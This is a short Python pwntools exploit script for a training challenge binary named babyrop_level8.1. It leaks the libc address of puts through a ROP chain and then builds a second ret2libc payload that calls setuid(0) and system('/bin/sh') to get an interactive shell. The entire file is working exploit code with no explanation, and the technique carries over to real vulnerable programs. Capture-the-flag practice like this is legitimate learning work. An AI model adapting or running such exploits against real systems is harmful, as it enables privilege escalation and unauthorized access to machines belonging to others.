from pwn import *
elf = context.binary = ELF("/challenge/babyrop_level8.1")
p = process()
context.terminal = ["tmux", "splitw", "-h"]
#p = gdb.debug("/challenge/babyrop_level8.1")
ret = 0x000000000040101a
offset = 72
pop_rdi = 0x0000000000401473
entry = 0x004010d0
put_plt = elf.plt['puts']
put_got = elf.got['puts']
payload = b'A'*offset + p64(pop_rdi)+ p64(put_got) + p64(put_plt) + p64(entry)
p.send(payload)
p.recvuntil(b'Leaving!\n')
temp = p.recvline().strip(b'\n')
log.info("Temp: %s", temp)
puts_leak = u64(temp.ljust(8,b'\x00'))
log.success("Leaked puts: %s", hex(puts_leak))
bin_sh = puts_leak + 1245597
system_address = puts_leak -205200
setuid = puts_leak + 392496
payload2 = b'B'*offset + p64(ret) + p64(pop_rdi) + p64(0) + p64(setuid) + p64(ret)
payload2 += p64(pop_rdi) + p64(bin_sh) + p64(system_address) + p64(0x0)
p.send(payload2)
p.interactive()